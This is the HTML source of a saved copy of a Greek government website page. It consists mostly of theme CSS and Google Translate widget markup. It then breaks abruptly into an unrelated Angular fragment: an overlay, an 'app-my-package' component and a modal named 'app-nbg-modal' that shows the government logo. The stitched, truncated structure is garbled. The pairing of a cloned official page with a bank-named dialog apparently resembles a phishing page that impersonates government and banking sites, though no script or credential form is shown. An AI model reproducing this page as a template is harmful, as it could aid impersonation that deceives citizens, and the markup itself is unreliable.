    .vc_tta-container .vc_tta-color-grey.vc_tta-tabs-position-top.vc_tta-style-classic .vc_tta-tabs-container .vc_tta-tab:hover > a,
    .td_block_template_1 .td-related-title .td-cur-simple-item,
    .woocommerce .product .products h2:not(.woocommerce-loop-product__title),
    .td-subcat-filter .td-subcat-dropdown:hover .td-subcat-more,
    .td-weather-information:before,
    .td-weather-week:before,
    .td_block_exchange .td-exchange-header:before,
    .td-theme-wrap .td_block_template_3 .td-block-title > *,
    .td-theme-wrap .td_block_template_4 .td-block-title > *,
    .td-theme-wrap .td_block_template_7 .td-block-title > *,
    .td-theme-wrap .td_block_template_9 .td-block-title:after,
    .td-theme-wrap .td_block_template_10 .td-block-title::before,
    .td-theme-wrap .td_block_template_11 .td-block-title::before,
    .td-theme-wrap .td_block_template_11 .td-block-title::after,
    .td-theme-wrap .td_block_template_14 .td-block-title,
    .td-theme-wrap .td_block_template_15 .td-block-title:before,
    .td-theme-wrap .td_block_template_17 .td-block-title:before {
        background-color: #004b8d;
    }

    .woocommerce div.product .woocommerce-tabs ul.tabs li.active {
    	background-color: #004b8d !important;
    }

    .block-title,
    .td_block_template_1 .td-related-title,
    .wpb_tabs .wpb_tabs_nav,
    .vc_tta-container .vc_tta-color-grey.vc_tta-tabs-position-top.vc_tta-style-classic .vc_tta-tabs-container,
    .woocommerce div.product .woocommerce-tabs ul.tabs:before,
    .td-theme-wrap .td_block_template_5 .td-block-title > *,
    .td-theme-wrap .td_block_template_17 .td-block-title,
    .td-theme-wrap .td_block_template_17 .td-block-title::before {
        border-color: #004b8d;
    }

    .td-theme-wrap .td_block_template_4 .td-block-title > *:before,
    .td-theme-wrap .td_block_template_17 .td-block-title::after {
        border-color: #004b8d transparent transparent transparent;
    }
    
    .td-theme-wrap .td_block_template_4 .td-related-title .td-cur-simple-item:before {
        border-color: #004b8d transparent transparent transparent !important;
    }

    
    .td-theme-wrap .block-title > span,
    .td-theme-wrap .block-title > span > a,
    .td-theme-wrap .widget_rss .block-title .rsswidget,
    .td-theme-wrap .block-title > a,
    .widgettitle,
    .widgettitle > a,
    .td-trending-now-title,
    .wpb_tabs li.ui-tabs-active a,
    .wpb_tabs li:hover a,
    .vc_tta-container .vc_tta-color-grey.vc_tta-tabs-position-top.vc_tta-style-classic .vc_tta-tabs-container .vc_tta-tab.vc_active > a,
    .vc_tta-container .vc_tta-color-grey.vc_tta-tabs-position-top.vc_tta-style-classic .vc_tta-tabs-container .vc_tta-tab:hover > a,
    .td-related-title .td-cur-simple-item,
    .woocommerce div.product .woocommerce-tabs ul.tabs li.active,
    .woocommerce .product .products h2:not(.woocommerce-loop-product__title),
    .td-theme-wrap .td_block_template_2 .td-block-title > *,
    .td-theme-wrap .td_block_template_3 .td-block-title > *,
    .td-theme-wrap .td_block_template_4 .td-block-title > *,
    .td-theme-wrap .td_block_template_5 .td-block-title > *,
    .td-theme-wrap .td_block_template_6 .td-block-title > *,
    .td-theme-wrap .td_block_template_6 .td-block-title:before,
    .td-theme-wrap .td_block_template_7 .td-block-title > *,
    .td-theme-wrap .td_block_template_8 .td-block-title > *,
    .td-theme-wrap .td_block_template_9 .td-block-title > *,
    .td-theme-wrap .td_block_template_10 .td-block-title > *,
    .td-theme-wrap .td_block_template_11 .td-block-title > *,
    .td-theme-wrap .td_block_template_12 .td-block-title > *,
    .td-theme-wrap .td_block_template_13 .td-block-title > span,
    .td-theme-wrap .td_block_template_13 .td-block-title > a,
    .td-theme-wrap .td_block_template_14 .td-block-title > *,
    .td-theme-wrap .td_block_template_14 .td-block-title-wrap .td-wrapper-pulldown-filter .td-pulldown-filter-display-option,
    .td-theme-wrap .td_block_template_14 .td-block-title-wrap .td-wrapper-pulldown-filter .td-pulldown-filter-display-option i,
    .td-theme-wrap .td_block_template_14 .td-block-title-wrap .td-wrapper-pulldown-filter .td-pulldown-filter-display-option:hover,
    .td-theme-wrap .td_block_template_14 .td-block-title-wrap .td-wrapper-pulldown-filter .td-pulldown-filter-display-option:hover i,
    .td-theme-wrap .td_block_template_15 .td-block-title > *,
    .td-theme-wrap .td_block_template_15 .td-block-title-wrap .td-wrapper-pulldown-filter,
    .td-theme-wrap .td_block_template_15 .td-block-title-wrap .td-wrapper-pulldown-filter i,
    .td-theme-wrap .td_block_template_16 .td-block-title > *,
    .td-theme-wrap .td_block_template_17 .td-block-title > * {
    	color: #ffffff;
    }


    
    .td-header-wrap .td-header-top-menu-full,
    .td-header-wrap .top-header-menu .sub-menu {
        background-color: #ffffff;
    }
    .td-header-style-8 .td-header-top-menu-full {
        background-color: transparent;
    }
    .td-header-style-8 .td-header-top-menu-full .td-header-top-menu {
        background-color: #ffffff;
        padding-left: 15px;
        padding-right: 15px;
    }

    .td-header-wrap .td-header-top-menu-full .td-header-top-menu,
    .td-header-wrap .td-header-top-menu-full {
        border-bottom: none;
    }


    
    .td-header-top-menu,
    .td-header-top-menu a,
    .td-header-wrap .td-header-top-menu-full .td-header-top-menu,
    .td-header-wrap .td-header-top-menu-full a,
    .td-header-style-8 .td-header-top-menu,
    .td-header-style-8 .td-header-top-menu a,
    .td-header-top-menu .td-drop-down-search .entry-title a {
        color: #231f20;
    }

    
    .top-header-menu .current-menu-item > a,
    .top-header-menu .current-menu-ancestor > a,
    .top-header-menu .current-category-ancestor > a,
    .top-header-menu li a:hover,
    .td-header-sp-top-widget .td-icon-search:hover {
        color: #004b8d;
    }

    
    .td-header-wrap .td-header-sp-top-widget .td-icon-font,
    .td-header-style-7 .td-header-top-menu .td-social-icon-wrap .td-icon-font {
        color: #004b8d;
    }

    
    .td-header-wrap .td-header-sp-top-widget i.td-icon-font:hover {
        color: #231f20;
    }


    
    .td-header-wrap .td-header-menu-wrap-full,
    .td-header-menu-wrap.td-affix,
    .td-header-style-3 .td-header-main-menu,
    .td-header-style-3 .td-affix .td-header-main-menu,
    .td-header-style-4 .td-header-main-menu,
    .td-header-style-4 .td-affix .td-header-main-menu,
    .td-header-style-8 .td-header-menu-wrap.td-affix,
    .td-header-style-8 .td-header-top-menu-full {
		background-color: #ffffff;
    }


    .td-boxed-layout .td-header-style-3 .td-header-menu-wrap,
    .td-boxed-layout .td-header-style-4 .td-header-menu-wrap,
    .td-header-style-3 .td_stretch_content .td-header-menu-wrap,
    .td-header-style-4 .td_stretch_content .td-header-menu-wrap {
    	background-color: #ffffff !important;
    }


    @media (min-width: 1019px) {
        .td-header-style-1 .td-header-sp-recs,
        .td-header-style-1 .td-header-sp-logo {
            margin-bottom: 28px;
        }
    }

    @media (min-width: 768px) and (max-width: 1018px) {
        .td-header-style-1 .td-header-sp-recs,
        .td-header-style-1 .td-header-sp-logo {
            margin-bottom: 14px;
        }
    }

    .td-header-style-7 .td-header-top-menu {
        border-bottom: none;
    }
    
    
    
    .sf-menu > .current-menu-item > a:after,
    .sf-menu > .current-menu-ancestor > a:after,
    .sf-menu > .current-category-ancestor > a:after,
    .sf-menu > li:hover > a:after,
    .sf-menu > .sfHover > a:after,
    .td_block_mega_menu .td-next-prev-wrap a:hover,
    .td-mega-span .td-post-category:hover,
    .td-header-wrap .black-menu .sf-menu > li > a:hover,
    .td-header-wrap .black-menu .sf-menu > .current-menu-ancestor > a,
    .td-header-wrap .black-menu .sf-menu > .sfHover > a,
    .td-header-wrap .black-menu .sf-menu > .current-menu-item > a,
    .td-header-wrap .black-menu .sf-menu > .current-menu-ancestor > a,
    .td-header-wrap .black-menu .sf-menu > .current-category-ancestor > a {
        background-color: #004b8d;
    }


    .td_block_mega_menu .td-next-prev-wrap a:hover {
        border-color: #004b8d;
    }

    .header-search-wrap .td-drop-down-search:before {
        border-color: transparent transparent #004b8d transparent;
    }

    .td_mega_menu_sub_cats .cur-sub-cat,
    .td_mod_mega_menu:hover .entry-title a,
    .td-theme-wrap .sf-menu ul .td-menu-item > a:hover,
    .td-theme-wrap .sf-menu ul .sfHover > a,
    .td-theme-wrap .sf-menu ul .current-menu-ancestor > a,
    .td-theme-wrap .sf-menu ul .current-category-ancestor > a,
    .td-theme-wrap .sf-menu ul .current-menu-item > a {
        color: #004b8d;
    }
    
    
    
    .td-header-wrap .td-header-menu-wrap .sf-menu > li > a,
    .td-header-wrap .td-header-menu-social .td-social-icon-wrap a,
    .td-header-style-4 .td-header-menu-social .td-social-icon-wrap i,
    .td-header-style-5 .td-header-menu-social .td-social-icon-wrap i,
    .td-header-style-6 .td-header-menu-social .td-social-icon-wrap i,
    .td-header-style-12 .td-header-menu-social .td-social-icon-wrap i,
    .td-header-wrap .header-search-wrap #td-header-search-button .td-icon-search {
        color: #231f20;
    }
    .td-header-wrap .td-header-menu-social + .td-search-wrapper #td-header-search-button:before {
      background-color: #231f20;
    }
    
    
    @media (max-width: 767px) {
        body .td-header-wrap .td-header-main-menu {
            background-color: #ffffff !important;
        }
    }


    
    @media (max-width: 767px) {
        body #td-top-mobile-toggle i,
        .td-header-wrap .header-search-wrap .td-icon-search {
            color: #004b8d !important;
        }
    }

    
    .td-menu-background:before,
    .td-search-background:before {
        background: #ffffff;
        background: -moz-linear-gradient(top, #ffffff 0%, #ffffff 100%);
        background: -webkit-gradient(left top, left bottom, color-stop(0%, #ffffff), color-stop(100%, #ffffff));
        background: -webkit-linear-gradient(top, #ffffff 0%, #ffffff 100%);
        background: -o-linear-gradient(top, #ffffff 0%, #ffffff 100%);
        background: -ms-linear-gradient(top, #ffffff 0%, #ffffff 100%);
        background: linear-gradient(to bottom, #ffffff 0%, #ffffff 100%);
        filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#ffffff', endColorstr='#ffffff', GradientType=0 );
    }

    
    .td-mobile-content .current-menu-item > a,
    .td-mobile-content .current-menu-ancestor > a,
    .td-mobile-content .current-category-ancestor > a,
    #td-mobile-nav .td-menu-login-section a:hover,
    #td-mobile-nav .td-register-section a:hover,
    #td-mobile-nav .td-menu-socials-wrap a:hover i,
    .td-search-close a:hover i {
        color: #004b8d;
    }

    
    #td-mobile-nav .td-register-section .td-login-button,
    .td-search-wrap-mob .result-msg a {
        color: #004b8d;
    }



    
    .td-mobile-content li a,
    .td-mobile-content .td-icon-menu-right,
    .td-mobile-content .sub-menu .td-icon-menu-right,
    #td-mobile-nav .td-menu-login-section a,
    #td-mobile-nav .td-menu-logout a,
    #td-mobile-nav .td-menu-socials-wrap .td-icon-font,
    .td-mobile-close .td-icon-close-mobile,
    .td-search-close .td-icon-close-mobile,
    .td-search-wrap-mob,
    .td-search-wrap-mob #td-header-search-mob,
    #td-mobile-nav .td-register-section,
    #td-mobile-nav .td-register-section .td-login-input,
    #td-mobile-nav label,
    #td-mobile-nav .td-register-section i,
    #td-mobile-nav .td-register-section a,
    #td-mobile-nav .td_display_err,
    .td-search-wrap-mob .td_module_wrap .entry-title a,
    .td-search-wrap-mob .td_module_wrap:hover .entry-title a,
    .td-search-wrap-mob .td-post-date {
        color: #004b8d;
    }
    .td-search-wrap-mob .td-search-input:before,
    .td-search-wrap-mob .td-search-input:after,
    #td-mobile-nav .td-menu-login-section .td-menu-login span {
        background-color: #004b8d;
    }

    #td-mobile-nav .td-register-section .td-login-input {
        border-bottom-color: #004b8d !important;
    }


    
    .td-header-wrap .td-logo-text-container .td-logo-text {
        color: #004b8d;
    }

    
    .td-header-wrap .td-logo-text-container .td-tagline-text {
        color: #818284;
    }
    
   
    
    .td-footer-wrapper,
    .td-footer-wrapper .td_block_template_7 .td-block-title > *,
    .td-footer-wrapper .td_block_template_17 .td-block-title,
    .td-footer-wrapper .td-block-title-wrap .td-wrapper-pulldown-filter {
        background-color: #004b8d;
    }

    
    .td-sub-footer-container {
        background-color: #231f20;
    }

    
    .td-sub-footer-container,
    .td-subfooter-menu li a {
        color: #ffffff;
    }

    
    .td-subfooter-menu li a:hover {
        color: #ffffff;
    }


    
    .post .td-post-header .entry-title {
        color: #231f20;
    }
    .td_module_15 .entry-title a {
        color: #231f20;
    }

    
    .td-module-meta-info .td-post-author-name a {
    	color: #231f20;
    }

    
    .td-post-content,
    .td-post-content p {
    	color: #818284;
    }

    
    .td-post-content h1,
    .td-post-content h2,
    .td-post-content h3,
    .td-post-content h4,
    .td-post-content h5,
    .td-post-content h6 {
    	color: #004b8d;
    }

    
    .post blockquote p,
    .page blockquote p {
    	color: #004b8d;
    }
    .post .td_quote_box,
    .page .td_quote_box {
        border-color: #004b8d;
    }


    
    .td-page-header h1,
    .td-page-title,
    .woocommerce-page .page-title {
    	color: #231f20;
    }

    
    .td-page-content p,
    .td-page-content .td_block_text_with_title,
    .woocommerce-page .page-description > p {
    	color: #818284;
    }

    
    .td-page-content h1,
    .td-page-content h2,
    .td-page-content h3,
    .td-page-content h4,
    .td-page-content h5,
    .td-page-content h6 {
    	color: #004b8d;
    }

    .td-page-content .widgettitle {
        color: #fff;
    }

    
    .td-footer-wrapper::before {
        background-image: url('https://government.gov.gr/wp-content/uploads/2017/09/thumbsnet-04-300x207.png');
    }

    
    .td-footer-wrapper::before {
        background-size: cover;
    }

    
    .td-footer-wrapper::before {
        opacity: 0.05;
    }



    
    .top-header-menu > li > a,
    .td-weather-top-widget .td-weather-now .td-big-degrees,
    .td-weather-top-widget .td-weather-header .td-weather-city,
    .td-header-sp-top-menu .td_data_time {
        font-family:Roboto;
	
    }
    
    .top-header-menu .menu-item-has-children li a {
    	font-family:Roboto;
	
    }
    
    ul.sf-menu > .td-menu-item > a,
    .td-theme-wrap .td-header-menu-social {
        font-family:Roboto;
	font-size:13px;
	font-style:normal;
	font-weight:normal;
	text-transform:none;
	
    }
    
    .sf-menu ul .td-menu-item a {
        font-family:Roboto;
	
    }
	
    .td_mod_mega_menu .item-details a {
        font-family:Roboto;
	
    }
    
    .td_mega_menu_sub_cats .block-mega-child-cats a {
        font-family:Roboto;
	
    }
    
    .td-mobile-content .td-mobile-main-menu > li > a {
        font-family:Roboto;
	
    }
    
    .td-mobile-content .sub-menu a {
        font-family:Roboto;
	
    }
    
    .block-title > span,
    .block-title > a,
    .widgettitle,
    .td-trending-now-title,
    .wpb_tabs li a,
    .vc_tta-container .vc_tta-color-grey.vc_tta-tabs-position-top.vc_tta-style-classic .vc_tta-tabs-container .vc_tta-tab > a,
    .td-theme-wrap .td-related-title a,
    .woocommerce div.product .woocommerce-tabs ul.tabs li a,
    .woocommerce .product .products h2:not(.woocommerce-loop-product__title),
    .td-theme-wrap .td-block-title {
        font-family:Roboto;
	
    }
    
    .td_module_wrap .td-post-author-name a {
        font-family:Roboto;
	
    }
    
    .td-post-date .entry-date {
        font-family:Roboto;
	font-size:9px;
	line-height:5px;
	font-style:normal;
	font-weight:normal;
	text-transform:none;
	
    }
    
    .td-module-comments a,
    .td-post-views span,
    .td-post-comments a {
        font-family:Roboto;
	
    }
    
    .td-big-grid-meta .td-post-category,
    .td_module_wrap .td-post-category,
    .td-module-image .td-post-category {
        font-family:Roboto;
	
    }
    
    .td-subcat-filter .td-subcat-dropdown a,
    .td-subcat-filter .td-subcat-list a,
    .td-subcat-filter .td-subcat-dropdown span {
        font-family:Roboto;
	
    }
    
    .td-excerpt,
    .td_module_14 .td-excerpt {
        font-family:Roboto;
	font-size:14px;
	line-height:18px;
	font-style:normal;
	font-weight:normal;
	text-transform:none;
	
    }


	
	.td_module_wrap .td-module-title {
		font-family:Roboto;
	
	}
     
    .td_module_1 .td-module-title {
    	font-family:Roboto;
	
    }
    
    .td_module_2 .td-module-title {
    	font-family:Roboto;
	font-size:14px;
	line-height:18px;
	font-style:normal;
	font-weight:normal;
	text-transform:none;
	
    }
    
    .td_module_3 .td-module-title {
    	font-family:Roboto;
	
    }
    
    .td_module_4 .td-module-title {
    	font-family:Roboto;
	
    }
    
    .td_module_5 .td-module-title {
    	font-family:Roboto;
	
    }
    
    .td_module_6 .td-module-title {
    	font-family:Roboto;
	font-size:12px;
	line-height:16px;
	font-style:normal;
	font-weight:300;
	text-transform:none;
	
    }
    
    .td_module_7 .td-module-title {
    	font-family:Roboto;
	font-size:13px;
	line-height:17px;
	font-weight:300;
	text-transform:none;
	
    }
    
    .td_module_8 .td-module-title {
    	font-family:Roboto;
	font-size:14px;
	line-height:17px;
	font-style:normal;
	font-weight:300;
	text-transform:none;
	
    }
    
    .td_module_9 .td-module-title {
    	font-family:Roboto;
	font-size:14px;
	line-height:17px;
	font-style:normal;
	font-weight:300;
	text-transform:none;
	
    }
    
    .td_module_10 .td-module-title {
    	font-family:Roboto;
	
    }
    
    .td_module_11 .td-module-title {
    	font-family:Roboto;
	
    }
    
    .td_module_12 .td-module-title {
    	font-family:Roboto;
	font-size:13px;
	line-height:17px;
	font-style:normal;
	font-weight:300;
	text-transform:none;
	
    }
    
    .td_module_13 .td-module-title {
    	font-family:Roboto;
	
    }
    
    .td_module_14 .td-module-title {
    	font-family:Roboto;
	
    }
    
    .td_module_15 .entry-title {
    	font-family:Roboto;
	font-size:18px;
	line-height:23px;
	font-style:normal;
	font-weight:normal;
	text-transform:none;
	
    }
    
    .td_module_16 .td-module-title {
    	font-family:Roboto;
	font-size:18px;
	line-height:23px;
	font-style:normal;
	font-weight:normal;
	text-transform:none;
	
    }
    
    .td_module_17 .td-module-title {
    	font-family:Roboto;
	
    }
    
    .td_module_18 .td-module-title {
    	font-family:Roboto;
	
    }
    
    .td_module_19 .td-module-title {
    	font-family:Roboto;
	
    }




	
	.td_block_trending_now .entry-title,
	.td-theme-slider .td-module-title,
    .td-big-grid-post .entry-title {
		font-family:Roboto;
	
	}
    
    .td_module_mx1 .td-module-title {
    	font-family:Roboto;
	font-size:14px;
	line-height:12px;
	font-style:normal;
	font-weight:500;
	text-transform:none;
	
    }
    
    .td_module_mx2 .td-module-title {
    	font-family:Roboto;
	
    }
    
    .td_module_mx3 .td-module-title {
    	font-family:Roboto;
	
    }
    
    .td_module_mx4 .td-module-title {
    	font-family:Roboto;
	font-size:14px;
	line-height:14px;
	font-style:normal;
	font-weight:normal;
	text-transform:none;
	
    }
    
    .td_module_mx5 .td-module-title {
    	font-family:Roboto;
	font-size:16px;
	line-height:8px;
	font-style:normal;
	font-weight:500;
	text-transform:none;
	
    }
    
    .td_module_mx6 .td-module-title {
    	font-family:Roboto;
	font-size:12px;
	font-style:normal;
	font-weight:500;
	text-transform:none;
	
    }
    
    .td_module_mx7 .td-module-title {
    	font-family:Roboto;
	font-size:12px;
	line-height:12px;
	font-style:normal;
	font-weight:500;
	text-transform:none;
	
    }
    
    .td_module_mx8 .td-module-title {
    	font-family:Roboto;
	font-size:8px;
	line-height:5px;
	font-style:normal;
	font-weight:normal;
	text-transform:none;
	
    }
    
    .td_module_mx9 .td-module-title {
    	font-family:Roboto;
	
    }
    
    .td_module_mx11 .td-module-title {
    	font-family:Roboto;
	font-size:14px;
	font-style:normal;
	font-weight:500;
	text-transform:none;
	
    }
    
    .td_module_mx16 .td-module-title {
    	font-family:Roboto;
	
    }
    
    .td_module_mx17 .td-module-title {
    	font-family:Roboto;
	
    }
    
    .td_block_trending_now .entry-title {
    	font-family:Roboto;
	
    }
    
    .td-theme-slider.iosSlider-col-1 .td-module-title {
        font-family:Roboto;
	font-size:15px;
	
    }
    
    .td-theme-slider.iosSlider-col-2 .td-module-title {
        font-family:Roboto;
	font-size:15px;
	
    }
    
    .td-theme-slider.iosSlider-col-3 .td-module-title {
        font-family:Roboto;
	font-size:28px;
	line-height:5px;
	font-style:normal;
	font-weight:normal;
	text-transform:none;
	
    }
    
    .td-big-grid-post.td-big-thumb .td-big-grid-meta,
    .td-big-thumb .td-big-grid-meta .entry-title {
        font-family:Roboto;
	font-size:18px;
	line-height:22px;
	font-style:normal;
	font-weight:normal;
	text-transform:none;
	
    }
    
    .td-big-grid-post.td-medium-thumb .td-big-grid-meta,
    .td-medium-thumb .td-big-grid-meta .entry-title {
        font-family:Roboto;
	font-size:16px;
	line-height:20px;
	font-style:normal;
	font-weight:normal;
	text-transform:none;
	
    }
    
    .td-big-grid-post.td-small-thumb .td-big-grid-meta,
    .td-small-thumb .td-big-grid-meta .entry-title {
        font-family:Roboto;
	font-size:14px;
	line-height:18px;
	font-style:normal;
	font-weight:normal;
	text-transform:none;
	
    }
    
    .td-big-grid-post.td-tiny-thumb .td-big-grid-meta,
    .td-tiny-thumb .td-big-grid-meta .entry-title {
        font-family:Roboto;
	font-size:12px;
	line-height:16px;
	font-style:normal;
	font-weight:normal;
	text-transform:none;
	
    }
    
    .homepage-post .td-post-template-8 .td-post-header .entry-title {
        font-family:Roboto;
	text-transform:none;
	
    }


    
	#td-mobile-nav,
	#td-mobile-nav .wpb_button,
	.td-search-wrap-mob {
		font-family:Roboto;
	
	}


	
	.post .td-post-header .entry-title {
		font-family:Roboto;
	
	}
    
    .td-post-template-default .td-post-header .entry-title {
        font-family:Roboto;
	font-size:30px;
	line-height:34px;
	font-style:normal;
	font-weight:normal;
	text-transform:none;
	
    }
    
    .td-post-template-1 .td-post-header .entry-title {
        font-family:Roboto;
	
    }
    
    .td-post-template-2 .td-post-header .entry-title {
        font-family:Roboto;
	font-size:30px;
	line-height:34px;
	font-style:normal;
	font-weight:normal;
	text-transform:none;
	
    }
    
    .td-post-template-3 .td-post-header .entry-title {
        font-family:Roboto;
	
    }
    
    .td-post-template-4 .td-post-header .entry-title {
        font-family:Roboto;
	
    }
    
    .td-post-template-5 .td-post-header .entry-title {
        font-family:Roboto;
	
    }
    
    .td-post-template-6 .td-post-header .entry-title {
        font-family:Roboto;
	
    }
    
    .td-post-template-7 .td-post-header .entry-title {
        font-family:Roboto;
	
    }
    
    .td-post-template-8 .td-post-header .entry-title {
        font-family:Roboto;
	
    }
    
    .td-post-template-9 .td-post-header .entry-title {
        font-family:Roboto;
	font-size:30px;
	line-height:34px;
	
    }
    
    .td-post-template-10 .td-post-header .entry-title {
        font-family:Roboto;
	
    }
    
    .td-post-template-11 .td-post-header .entry-title {
        font-family:Roboto;
	
    }
    
    .td-post-template-12 .td-post-header .entry-title {
        font-family:Roboto;
	
    }
    
    .td-post-template-13 .td-post-header .entry-title {
        font-family:Roboto;
	
    }





	
    .td-post-content p,
    .td-post-content {
        font-family:Roboto;
	font-size:16px;
	line-height:22px;
	font-style:normal;
	font-weight:normal;
	text-transform:none;
	
    }
    
    .post blockquote p,
    .page blockquote p,
    .td-post-text-content blockquote p {
        font-family:Roboto;
	font-size:24px;
	line-height:34px;
	font-style:italic;
	font-weight:300;
	text-transform:none;
	
    }
    
    .post .td_quote_box p,
    .page .td_quote_box p {
        font-family:Roboto;
	
    }
    
    .post .td_pull_quote p,
    .page .td_pull_quote p,
    .post .wp-block-pullquote blockquote p,
    .page .wp-block-pullquote blockquote p {
        font-family:Roboto;
	
    }
    
    .td-post-content li {
        font-family:Roboto;
	
    }
    
    .td-post-content h1 {
        font-family:Roboto;
	
    }
    
    .td-post-content h2 {
        font-family:Roboto;
	
    }
    
    .td-post-content h3 {
        font-family:Roboto;
	
    }
    
    .td-post-content h4 {
        font-family:Roboto;
	
    }
    
    .td-post-content h5 {
        font-family:Roboto;
	
    }
    
    .td-post-content h6 {
        font-family:Roboto;
	
    }





    
    .post .td-category a {
        font-family:Roboto;
	
    }
    
    .post header .td-post-date .entry-date {
        font-family:Roboto;
	
    }
    
    .post .td-post-source-tags a,
    .post .td-post-source-tags span {
        font-family:Roboto;
	
    }
    
    .post .td-post-next-prev-content span {
        font-family:Roboto;
	
    }
    
    .post .td-post-next-prev-content a {
        font-family:Roboto;
	
    }
    
    .td_block_related_posts .entry-title a {
        font-family:Roboto;
	
    }
    
    .post .td-post-share-title {
        font-family:Roboto;
	
    }
    
	.wp-caption-text,
	.wp-caption-dd,
	 .wp-block-image figcaption {
		font-family:Roboto;
	
	}
    
    .td-post-template-default .td-post-sub-title,
    .td-post-template-1 .td-post-sub-title,
    .td-post-template-4 .td-post-sub-title,
    .td-post-template-5 .td-post-sub-title,
    .td-post-template-9 .td-post-sub-title,
    .td-post-template-10 .td-post-sub-title,
    .td-post-template-11 .td-post-sub-title {
        font-family:Roboto;
	font-size:14px;
	
    }
    
    .td-post-template-2 .td-post-sub-title,
    .td-post-template-3 .td-post-sub-title,
    .td-post-template-6 .td-post-sub-title,
    .td-post-template-7 .td-post-sub-title,
    .td-post-template-8 .td-post-sub-title {
        font-family:Roboto;
	font-size:14px;
	
    }




	
    .td-page-title,
    .woocommerce-page .page-title,
    .td-category-title-holder .td-page-title {
    	font-family:Roboto;
	font-size:30px;
	line-height:34px;
	
    }
    
    .td-page-content p,
    .td-page-content li,
    .td-page-content .td_block_text_with_title,
    .woocommerce-page .page-description > p,
    .wpb_text_column p {
    	font-family:Roboto;
	font-size:16px;
	line-height:22px;
	
    }
    
    .td-page-content h1,
    .wpb_text_column h1 {
    	font-family:Roboto;
	
    }
    
    .td-page-content h2,
    .wpb_text_column h2 {
    	font-family:Roboto;
	
    }
    
    .td-page-content h3,
    .wpb_text_column h3 {
    	font-family:Roboto;
	
    }
    
    .td-page-content h4,
    .wpb_text_column h4 {
    	font-family:Roboto;
	
    }
    
    .td-page-content h5,
    .wpb_text_column h5 {
    	font-family:Roboto;
	
    }
    
    .td-page-content h6,
    .wpb_text_column h6 {
    	font-family:Roboto;
	
    }




    
	.footer-text-wrap {
		font-family:Roboto;
	
	}
	
	.td-sub-footer-copy {
		font-family:Roboto;
	
	}
	
	.td-sub-footer-menu ul li a {
		font-family:Roboto;
	
	}




	
    .entry-crumbs a,
    .entry-crumbs span,
    #bbpress-forums .bbp-breadcrumb a,
    #bbpress-forums .bbp-breadcrumb .bbp-breadcrumb-current {
    	font-family:Roboto;
	
    }
    
    .category .td-category a {
    	font-family:Roboto;
	
    }
    
    .td-trending-now-display-area .entry-title {
    	font-family:Roboto;
	
    }
    
    .page-nav a,
    .page-nav span {
    	font-family:Roboto;
	
    }
    
    #td-outer-wrap span.dropcap,
    #td-outer-wrap p.has-drop-cap:not(:focus)::first-letter {
    	font-family:Roboto;
	
    }
    
    .widget_archive a,
    .widget_calendar,
    .widget_categories a,
    .widget_nav_menu a,
    .widget_meta a,
    .widget_pages a,
    .widget_recent_comments a,
    .widget_recent_entries a,
    .widget_text .textwidget,
    .widget_tag_cloud a,
    .widget_search input,
    .woocommerce .product-categories a,
    .widget_display_forums a,
    .widget_display_replies a,
    .widget_display_topics a,
    .widget_display_views a,
    .widget_display_stats {
    	font-family:Roboto;
	
    }
    
	input[type="submit"],
	.td-read-more a,
	.vc_btn,
	.woocommerce a.button,
	.woocommerce button.button,
	.woocommerce #respond input#submit {
		font-family:Roboto;
	
	}
	
    body, p {
    	font-family:Roboto;
	
    }
</style>




<div id="goog-gt-tt" class="skiptranslate" dir="ltr"><div style="padding: 8px;"><div><div class="logo"><img src="./Greek Government_files/translate_24dp.png" width="20" height="20" alt="Google Translate"></div></div></div><div class="top" style="padding: 8px; float: left; width: 100%;"><h1 class="title gray">Original text</h1></div><div class="middle" style="padding: 8px;"><div class="original-text"></div></div><div class="bottom" style="padding: 8px;"><div class="activity-links"><span class="activity-link">Contribute a better translation</span><span class="activity-link"></span></div><div class="started-activity-container"><hr style="color: #CCC; background-color: #CCC; height: 1px; border: none;"><div class="activity-root"></div></div></div><div class="status-message" style="display: none;"></div></div><!--
Performance optimized by W3 Total Cache. Learn more: https://www.boldgrid.com/w3-total-cache/

Page Caching using disk: enhanced 

Served from: government.gov.gr @ 2022-03-30 05:04:01 by W3 Total Cache
--><div class="goog-te-spinner-pos"><div class="goog-te-spinner-animation"><svg xmlns="http://www.w3.org/2000/svg" class="goog-te-spinner" width="96px" height="96px" viewBox="0 0 66 66"><circle class="goog-te-spinner-path" fill="none" stroke-width="6" stroke-linecap="round" cx="33" cy="33" r="30"></circle></svg></div></div><iframe frameborder="0" class="goog-te-menu-frame skiptranslate" title="Language Translate Widget" style="visibility: visible; box-sizing: content-box; width: 209px; height: 263px; display: none;" src="./Greek Government_files/saved_resource.html"></iframe><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">.</font></font></div><div id="goog-gt-tt" class="skiptranslate" dir="ltr"><div style="padding: 8px;"><div><div class="logo"><img src="./Greek Government_files/translate_24dp(1).png" width="20" height="20" alt="Google Translate"></div></div></div><div class="top" style="padding: 8px; float: left; width: 100%;"><h1 class="title gray">Original text</h1></div><div class="middle" style="padding: 8px;"><div class="original-text"></div></div><div class="bottom" style="padding: 8px;"><div class="activity-links"><span class="activity-link">Contribute a better translation</span><span class="activity-link"></span></div><div class="started-activity-container"><hr style="color: #CCC; background-color: #CCC; height: 1px; border: none;"><div class="activity-root"></div></div></div><div class="status-message" style="display: none;"></div></div><div class="swal-overlay swal-overlay--show-modal" tabindex="-1">
 < </footer>
         </app-my-package>
      </app-root>
      <div class="cdk-overlay-container">
         <div class="cdk-overlay-backdrop cdk-overlay-dark-backdrop cdk-overlay-backdrop-showing"></div>
         <div class="cdk-global-overlay-wrapper" dir="ltr" style="justify-content: center; align-items: center;">
            <div id="cdk-overlay-0" class="cdk-overlay-pane custom-dialog-container" style="max-width: 80vw; width: 380px; height: 710px; position: static;">
               <div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true"></div>
               <mat-dialog-container tabindex="-1" aria-modal="true" class="mat-dialog-container ng-tns-c43-0 ng-trigger ng-trigger-dialogContainer ng-star-inserted" id="mat-dialog-0" role="dialog" style="transform: none;">
                  <app-dialog-body _nghost-vle-c50="" class="ng-star-inserted">
                     <app-nbg-modal _ngcontent-vle-c50="" _nghost-vle-c47="" class="ng-star-inserted" style="">
                        <div _ngcontent-vle-c47="" class="modal-page">
                           <div _ngcontent-vle-c47="" class="header">
                              <div _ngcontent-vle-c47=""><img _ngcontent-vle-c47="" width="170px" src="https://government.gov.gr/wp-content/uploads/2019/07/gov_site-500x165.png"></div>
                              <div _ngcontent-vle-c47="" ></div>
